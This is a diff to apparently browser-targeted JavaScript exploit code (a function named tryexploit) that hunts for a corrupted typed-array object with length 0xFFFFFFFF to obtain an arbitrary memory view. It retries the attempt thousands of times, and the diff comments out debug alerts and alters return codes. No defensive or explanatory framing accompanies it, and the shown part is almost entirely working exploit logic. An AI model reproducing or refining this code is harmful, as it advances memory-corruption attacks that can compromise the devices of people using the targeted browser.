@@ -45,17 +45,17 @@ function tryexploit(a_c, p_c){
 		var stale = target.stale;
 		var after_len = stale.length;
 		if (before_len == after_len) {
-			alert("Exploit Failed.");
+			//alert("Exploit Failed.");
 			return 0;
 		} else {
-			alert("Exploit Worked.");
+			//alert("Exploit Worked.");
 			
 			for (x = attempts.length - 1; x >= 1; x--) 
 			{ 
 				if (attempts[x].length != 80 / 4) // Check if this array has the original backing arraybuffer(or a length of 80 / 4)
 				{
 					alert("Found non JSArray type");
-					return 1;
+					return 2;
 					if (attempts[x].length == -1) // Check if the length is 0xFFFFFFFF (-1), if so it is the JSGenericTypedArrayView type
 					{
 						memory_view = attempts[x];
@@ -67,7 +67,7 @@ function tryexploit(a_c, p_c){
 				}
 			}
 			
-			alert("after loop");
+			//alert("after loop");
 			return 1;
 		}
 	} 
@@ -80,7 +80,7 @@ function tryexploit(a_c, p_c){
 
 function forcetryexploit(ac, pc){
 	for(i=0; i< 10000; i++){
-		if(tryexploit(ac, pc) == 1){
+		if(tryexploit(ac, pc) == 2){
 			alert("Finally worked!");
 			break;
 		}
